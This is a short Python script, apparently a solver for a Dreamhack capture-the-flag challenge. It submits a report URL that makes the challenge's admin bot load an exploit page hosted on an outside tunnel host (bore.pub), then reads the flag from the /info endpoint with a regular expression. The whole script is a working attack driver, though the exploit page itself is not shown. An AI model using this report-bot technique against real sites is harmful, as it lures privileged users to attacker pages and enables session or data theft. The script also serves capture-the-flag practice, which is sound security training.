import requests
import re

url = 'http://host3.dreamhack.games:16848/'
s = requests.Session()

print("> Reporting exploit page")

payload_url = 'http://bore.pub:24002'

res = s.post(f'{url}/report', data={
    'report_url': f'{payload_url}/exploit.html'
})

# get flag
res = s.get(f"{url}/info")

flag = re.findall(r'(DH{.+?})', res.text)[0]
print("Flag:", flag)